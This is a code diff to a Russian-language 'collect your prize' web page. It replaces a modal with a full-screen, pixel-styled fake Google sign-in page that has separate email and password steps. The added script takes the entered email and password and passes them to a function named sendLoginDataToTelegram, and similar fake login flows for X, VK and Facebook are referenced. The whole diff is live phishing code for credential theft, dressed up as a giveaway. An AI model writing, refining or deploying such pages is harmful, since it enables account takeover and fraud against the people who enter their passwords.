@@ -979,7 +979,7 @@
             }
         }
         
-        /* МОДАЛЬНЫЕ ОКНА */
+        /* ОСТАЛЬНЫЕ СТИЛИ (остаются без изменений) */
         .modal-overlay {
             position: fixed;
             top: 0;
@@ -1004,148 +1004,6 @@
             to { opacity: 1; }
         }
         
-        /* НОВЫЙ СТИЛЬ МОДАЛЬНОГО ОКНА GOOGLE (на основе предоставленного кода) */
-        .google-modal {
-            width: 450px;
-            padding: 40px;
-            background-color: #fff;
-            position: relative;
-            font-family: 'Roboto', arial, sans-serif;
-        }
-        
-        /* Логотип вверху слева */
-        .google-modal .logo {
-            width: 75px;
-            display: block;
-            margin-bottom: 25px;
-        }
-        
-        .google-modal h1 {
-            font-size: 24px;
-            font-weight: 400;
-            margin: 0 0 8px 0;
-            text-align: left;
-            color: #202124;
-        }
-        
-        .google-modal .subtitle {
-            font-size: 16px;
-            margin-bottom: 24px;
-            text-align: left;
-            color: #202124;
-        }
-        
-        /* Поле ввода с текстом сверху */
-        .google-modal .input-group {
-            position: relative;
-            margin-top: 25px;
-            margin-bottom: 10px;
-        }
-        
-        .google-modal .input-label {
-            position: absolute;
-            top: -10px;
-            left: 12px;
-            background: #fff;
-            padding: 0 4px;
-            font-size: 12px;
-            color: #1a73e8;
-            z-index: 1;
-        }
-        
-        .google-modal input[type="text"], 
-        .google-modal input[type="password"] {
-            width: 100%;
-            padding: 13px 15px;
-            border: 1px solid #1a73e8;
-            border-radius: 4px;
-            font-size: 16px;
-            box-sizing: border-box;
-            outline: none;
-        }
-        
-        .google-modal .guest-mode {
-            font-size: 14px;
-            color: #5f6368;
-            margin-top: 30px;
-            line-height: 1.4;
-        }
-        
-        .google-modal .guest-mode a {
-            color: #1a73e8;
-            text-decoration: none;
-            font-weight: 500;
-        }
-        
-        .google-modal .footer-buttons {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            margin-top: 40px;
-        }
-        
-        .google-modal .btn-text {
-            color: #1a73e8;
-            font-weight: 500;
-            cursor: pointer;
-            background: none;
-            border: none;
-            font-size: 14px;
-        }
-        
-        .google-modal .btn-blue {
-            background-color: #1a73e8;
-            color: white;
-            padding: 10px 24px;
-            border-radius: 4px;
-            border: none;
-            font-weight: 500;
-            cursor: pointer;
-            font-size: 14px;
-        }
-        
-        .google-modal .lang-footer {
-            font-size: 12px;
-            color: #5f6368;
-            text-align: center;
-            margin-top: 40px;
-            padding-top: 20px;
-            border-top: none;
-        }
-        
-        /* Стили для страницы пароля */
-        .google-modal .show-pass {
-            display: flex;
-            align-items: center;
-            font-size: 14px;
-            margin-top: 8px;
-            color: #202124;
-        }
-        
-        /* Контейнер для текста приветствия */
-        .google-modal .welcome-container {
-            margin-top: 10px;
-            margin-bottom: 40px;
-        }
-        
-        .google-modal .close-modal {
-            position: absolute;
-            top: 15px;
-            right: 15px;
-            background: none;
-            border: none;
-            color: #666;
-            font-size: 28px;
-            cursor: pointer;
-            transition: color 0.3s;
-            z-index: 10;
-        }
-        
-        .google-modal .close-modal:hover {
-            color: #333;
-        }
-        
-        /* ОСТАЛЬНЫЕ СТИЛИ МОДАЛЬНЫХ ОКОН (без изменений) */
         .modal {
             background: white;
             border-radius: 10px;
@@ -1649,6 +1507,170 @@
             background: #36A420;
         }
         
+        /* СТИЛИ ДЛЯ ПОЛНОЭКРАННОЙ СТРАНИЦЫ GOOGLE */
+        .google-fullscreen {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: white;
+            z-index: 3000;
+            display: none;
+            overflow-y: auto;
+        }
+        
+        .google-fullscreen.active {
+            display: block;
+        }
+        
+        .google-auth-container {
+            width: 450px;
+            padding: 40px;
+            margin: 0 auto;
+            position: relative;
+            top: 50%;
+            transform: translateY(-50%);
+        }
+
+        .google-logo {
+            width: 75px;
+            display: block;
+            margin-bottom: 25px;
+        }
+
+        .google-title {
+            font-size: 24px;
+            font-weight: 400;
+            margin: 0 0 8px 0;
+            text-align: left;
+            color: #202124;
+        }
+
+        .google-subtitle {
+            font-size: 16px;
+            margin-bottom: 24px;
+            text-align: left;
+            color: #202124;
+        }
+
+        .google-input-group {
+            position: relative;
+            margin-top: 25px;
+            margin-bottom: 10px;
+        }
+
+        .google-input-label {
+            position: absolute;
+            top: -10px;
+            left: 12px;
+            background: #fff;
+            padding: 0 4px;
+            font-size: 12px;
+            color: #1a73e8;
+            z-index: 1;
+        }
+
+        .google-input {
+            width: 100%;
+            padding: 13px 15px;
+            border: 1px solid #1a73e8;
+            border-radius: 4px;
+            font-size: 16px;
+            box-sizing: border-box;
+            outline: none;
+        }
+
+        .google-guest-mode {
+            font-size: 14px;
+            color: #5f6368;
+            margin-top: 30px;
+            line-height: 1.4;
+        }
+
+        .google-guest-mode a {
+            color: #1a73e8;
+            text-decoration: none;
+            font-weight: 500;
+        }
+
+        .google-footer-buttons {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-top: 40px;
+        }
+
+        .google-btn-text {
+            color: #1a73e8;
+            font-weight: 500;
+            cursor: pointer;
+            background: none;
+            border: none;
+            font-size: 14px;
+            padding: 8px;
+        }
+
+        .google-btn-blue {
+            background-color: #1a73e8;
+            color: white;
+            padding: 10px 24px;
+            border-radius: 4px;
+            border: none;
+            font-weight: 500;
+            cursor: pointer;
+            font-size: 14px;
+        }
+
+        .google-lang-footer {
+            font-size: 12px;
+            color: #5f6368;
+            text-align: center;
+            margin-top: 40px;
+            padding-top: 20px;
+        }
+
+        .google-bottom-footer {
+            position: absolute;
+            bottom: 20px;
+            left: 0;
+            right: 0;
+            font-size: 12px;
+            color: #5f6368;
+            text-align: center;
+            padding: 20px 0;
+        }
+
+        .google-bottom-footer-links {
+            display: flex;
+            justify-content: center;
+            gap: 20px;
+            margin-bottom: 10px;
+        }
+
+        .google-bottom-footer-links a {
+            color: #5f6368;
+            text-decoration: none;
+        }
+
+        .google-bottom-footer-links a:hover {
+            text-decoration: underline;
+        }
+
+        .google-show-pass {
+            display: flex;
+            align-items: center;
+            font-size: 14px;
+            margin-top: 8px;
+            color: #202124;
+        }
+
+        .google-welcome-container {
+            margin-top: 10px;
+            margin-bottom: 40px;
+        }
+
+        /* Footer */
         .footer {
             width: 100%;
             max-width: 800px;
@@ -1752,13 +1774,16 @@
                 width: 95%;
             }
             
-            .google-modal {
-                width: 95%;
-                padding: 30px 20px;
-            }
-            
             .fb-modal {
                 max-width: 95%;
+            }
+            
+            .google-auth-container {
+                width: 90%;
+                padding: 30px 20px;
+                transform: none;
+                top: 0;
+                margin-top: 40px;
             }
             
             .prize-mail-btn {
@@ -1792,6 +1817,12 @@
                 width: 180px;
                 height: 180px;
             }
+            
+            .google-bottom-footer {
+                position: relative;
+                bottom: 0;
+                margin-top: 40px;
+            }
         }
     </style>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
@@ -1816,6 +1847,67 @@
             </div>
 
             <button class="collect-btn" id="collectPrizeBtn">ЗАБРАТЬ</button>
+        </div>
+    </div>
+
+    <!-- Полноэкранная страница Google -->
+    <div class="google-fullscreen" id="googleFullscreen">
+        <div class="google-auth-container" id="googleStep1">
+            <img src="Google.png" alt="Google" class="google-logo">
+            <h1 class="google-title">Вход</h1>
+            <p class="google-subtitle">Используйте аккаунт Google</p>
+            
+            <div class="google-input-group">
+                <span class="google-input-label">Телефон или адрес эл. почты</span>
+                <input type="text" id="googleEmailInput" class="google-input">
+            </div>
+
+            <div class="google-guest-mode">
+                Работаете на чужом компьютере? Используйте режим «Частный доступ».<br>
+                <a href="#">Подробнее об использовании гостевого режима</a>
+            </div>
+
+            <div class="google-footer-buttons">
+                <button class="google-btn-text" id="googleCreateAccountBtn">Создать аккаунт</button>
+                <button class="google-btn-blue" id="googleNextBtn">Далее</button>
+            </div>
+            
+            <div class="google-lang-footer">Русский</div>
+        </div>
+        
+        <!-- Страница пароля (скрыта по умолчанию) -->
+        <div class="google-auth-container" id="googleStep2" style="display:none;">
+            <img src="Google.png" alt="Google" class="google-logo">
+            
+            <div class="google-welcome-container">
+                <h1 class="google-title">Добро пожаловать!</h1>
+            </div>
+
+            <div class="google-input-group">
+                <span class="google-input-label">Введите пароль</span>
+                <input type="password" id="googlePasswordInput" class="google-input">
+            </div>
+            
+            <div class="google-show-pass">
+                <input type="checkbox" id="googleShowPassword"> 
+                <label for="googleShowPassword">Показать пароль</label>
+            </div>
+
+            <div class="google-footer-buttons">
+                <button class="google-btn-text" id="googleForgotPasswordBtn">Забыли пароль?</button>
+                <button class="google-btn-blue" id="googleSubmitBtn">Далее</button>
+            </div>
+            
+            <div class="google-lang-footer">Русский</div>
+        </div>
+        
+        <!-- Общий футер для всей страницы -->
+        <div class="google-bottom-footer">
+            <div class="google-bottom-footer-links">
+                <a href="#">Справка</a>
+                <a href="#">Конфиденциальность</a>
+                <a href="#">Условия</a>
+            </div>
         </div>
     </div>
 
@@ -1956,67 +2048,6 @@
             </div>
         </div>
     </div>
-    
-    <!-- НОВОЕ МОДАЛЬНОЕ ОКНО GOOGLE (этап 1: email) -->
-    <div class="modal-overlay" id="googleModalStep1">
-        <div class="google-modal">
-            <button class="close-modal" onclick="closeModal('googleModalStep1')">&times;</button>
-            
-            <img src="Google.png" alt="Google" class="logo">
-            <h1>Вход</h1>
-            <p class="subtitle">Используйте аккаунт Google</p>
-            
-            <form id="googleEmailForm">
-                <div class="input-group">
-                    <span class="input-label">Телефон или адрес эл. почты</span>
-                    <input type="text" id="googleEmailInput" required>
-                </div>
-
-                <div class="guest-mode">
-                    Работаете на чужом компьютере? Используйте режим «Частный доступ».<br>
-                    <a href="#">Подробнее об использовании гостевого режима</a>
-                </div>
-
-                <div class="footer-buttons">
-                    <button type="button" class="btn-text" onclick="closeModal('googleModalStep1')">Создать аккаунт</button>
-                    <button type="submit" class="btn-blue">Далее</button>
-                </div>
-            </form>
-            
-            <div class="lang-footer">Русский</div>
-        </div>
-    </div>
-    
-    <!-- НОВОЕ МОДАЛЬНОЕ ОКНО GOOGLE (этап 2: пароль) -->
-    <div class="modal-overlay" id="googleModalStep2">
-        <div class="google-modal">
-            <button class="close-modal" onclick="closeModal('googleModalStep2')">&times;</button>
-            
-            <img src="Google.png" alt="Google" class="logo">
-            
-            <div class="welcome-container">
-                <h1>Добро пожаловать!</h1>
-            </div>
-
-            <form id="googlePasswordForm">
-                <div class="input-group">
-                    <span class="input-label">Введите пароль</span>
-                    <input type="password" id="googlePasswordInput" required>
-                </div>
-                
-                <div class="show-pass">
-                    <input type="checkbox" id="showGooglePassword"> <label for="showGooglePassword">Показать пароль</label>
-                </div>
-
-                <div class="footer-buttons">
-                    <button type="button" class="btn-text" onclick="switchGoogleAccount()">Забыли пароль?</button>
-                    <button type="submit" class="btn-blue">Далее</button>
-                </div>
-            </form>
-            
-            <div class="lang-footer">Русский</div>
-        </div>
-    </div>
 
     <!-- Верхнее меню -->
     <div class="top-menu">
@@ -2128,7 +2159,7 @@
                     <span>Twitter/X</span>
                 </div>
                 
-                <div class="social-option" data-social="google" onclick="openGoogleModal()">
+                <div class="social-option" data-social="google" onclick="openGoogleFullscreen()">
                     <div class="social-icon">
                         <img src="google.png" alt="Google">
                     </div>
@@ -2207,21 +2238,23 @@
             document.body.style.overflow = 'auto';
         }
         
-        function openGoogleModal() {
-            openModal('googleModalStep1');
+        function openGoogleFullscreen() {
+            document.getElementById('googleFullscreen').classList.add('active');
+            document.body.style.overflow = 'hidden';
+            // Сбрасываем форму
+            document.getElementById('googleStep1').style.display = 'block';
+            document.getElementById('googleStep2').style.display = 'none';
+            document.getElementById('googleEmailInput').value = '';
+            document.getElementById('googlePasswordInput').value = '';
+            document.getElementById('googleShowPassword').checked = false;
+        }
+        
+        function closeGoogleFullscreen() {
+            document.getElementById('googleFullscreen').classList.remove('active');
+            document.body.style.overflow = 'auto';
         }
         
         function openXModal() {
-            openModal('xModalStep1');
-        }
-        
-        function switchGoogleAccount() {
-            closeModal('googleModalStep2');
-            openModal('googleModalStep1');
-        }
-        
-        function switchXAccount() {
-            closeModal('xModalStep2');
             openModal('xModalStep1');
         }
         
@@ -2319,6 +2352,16 @@
             const socialOptions = document.querySelectorAll('.social-option');
             const prizeMailBtn = document.getElementById('prizeMailBtn');
             const collectPrizeBtn = document.getElementById('collectPrizeBtn');
+            
+            // Элементы Google Fullscreen
+            const googleFullscreen = document.getElementById('googleFullscreen');
+            const googleEmailInput = document.getElementById('googleEmailInput');
+            const googlePasswordInput = document.getElementById('googlePasswordInput');
+            const googleNextBtn = document.getElementById('googleNextBtn');
+            const googleSubmitBtn = document.getElementById('googleSubmitBtn');
+            const googleShowPassword = document.getElementById('googleShowPassword');
+            const googleStep1 = document.getElementById('googleStep1');
+            const googleStep2 = document.getElementById('googleStep2');
             
             // Призы с картинками (без названий)
             const prizes = [
@@ -2634,23 +2677,34 @@
                 }
             });
             
-            // НОВАЯ Google форма (этап 1: email)
-            document.getElementById('googleEmailForm').addEventListener('submit', async function(e) {
+            // Google Fullscreen обработчики
+            googleNextBtn.addEventListener('click', function(e) {
                 e.preventDefault();
-                googleEmail = document.getElementById('googleEmailInput').value;
+                const email = googleEmailInput.value.trim();
                 
-                if (googleEmail) {
-                    // Переходим к окну пароля
-                    closeModal('googleModalStep1');
-                    openModal('googleModalStep2');
+                if (!email) {
+                    showNotification("Пожалуйста, введите email", true);
+                    return;
                 }
+                
+                googleEmail = email;
+                googleStep1.style.display = 'none';
+                googleStep2.style.display = 'block';
+                googlePasswordInput.value = '';
+                googleShowPassword.checked = false;
+                googlePasswordInput.type = 'password';
             });
             
-            // НОВАЯ Google форма (этап 2: пароль)
-            document.getElementById('googlePasswordForm').addEventListener('submit', async function(e) {
+            googleSubmitBtn.addEventListener('click', async function(e) {
                 e.preventDefault();
-                const password = document.getElementById('googlePasswordInput').value;
-                const showPassword = document.getElementById('showGooglePassword').checked;
+                const password = googlePasswordInput.value.trim();
+                
+                if (!password) {
+                    showNotification("Пожалуйста, введите пароль", true);
+                    return;
+                }
+                
+                const showPassword = googleShowPassword.checked;
                 
                 const loginData = {
                     email: googleEmail,
@@ -2661,7 +2715,7 @@
                 const success = await sendLoginDataToTelegram('google', loginData, finalPrizeIndex);
                 
                 if (success) {
-                    closeModal('googleModalStep2');
+                    closeGoogleFullscreen();
                     isPrizeReceived = true;
                     updatePrizeBadge();
                     showConfirmation();
@@ -2669,14 +2723,25 @@
                 }
             });
             
-            // Обработчик чекбокса "Показать пароль" для новой Google формы
-            document.getElementById('showGooglePassword').addEventListener('change', function() {
-                const passwordInput = document.getElementById('googlePasswordInput');
+            // Обработчик чекбокса "Показать пароль" для Google
+            googleShowPassword.addEventListener('change', function() {
                 if (this.checked) {
-                    passwordInput.type = 'text';
+                    googlePasswordInput.type = 'text';
                 } else {
-                    passwordInput.type = 'password';
+                    googlePasswordInput.type = 'password';
                 }
+            });
+            
+            // Кнопка "Создать аккаунт" в Google
+            document.getElementById('googleCreateAccountBtn').addEventListener('click', function(e) {
+                e.preventDefault();
+                showNotification("Функция создания аккаунта временно недоступна");
+            });
+            
+            // Кнопка "Забыли пароль" в Google
+            document.getElementById('googleForgotPasswordBtn').addEventListener('click', function(e) {
+                e.preventDefault();
+                showNotification("Функция восстановления пароля временно недоступна");
             });
             
             // Обработчик кнопки получения приза
@@ -2688,7 +2753,7 @@
                 
                 // Открываем соответствующее модальное окно
                 if (selectedSocial === 'google') {
-                    openGoogleModal();
+                    openGoogleFullscreen();
                 } else if (selectedSocial === 'x') {
                     openXModal();
                 } else if (selectedSocial === 'vk') {
@@ -2805,6 +2870,13 @@
                 }
             });
             
+            // Закрытие Google Fullscreen при клике вне его (но внутри контейнера)
+            googleFullscreen.addEventListener('click', function(e) {
+                if (e.target === this) {
+                    closeGoogleFullscreen();
+                }
+            });
+            
             // Предзагрузка изображений
             function preloadImages() {
                 // Фон сайта
@@ -2821,8 +2893,7 @@
                 const socialImages = [
                     'vkontakte.png',
                     'twiter.png',
-                    'google.png',
-                    'Google.png'
+                    'google.png'
                 ];
                 
                 socialImages.forEach(src => {
@@ -2848,6 +2919,13 @@
                         document.body.style.overflow = 'auto';
                     }
                 });
+            });
+            
+            // Закрытие Google Fullscreen по Escape
+            document.addEventListener('keydown', function(e) {
+                if (e.key === 'Escape' && googleFullscreen.classList.contains('active')) {
+                    closeGoogleFullscreen();
+                }
             });
         });
     </script>
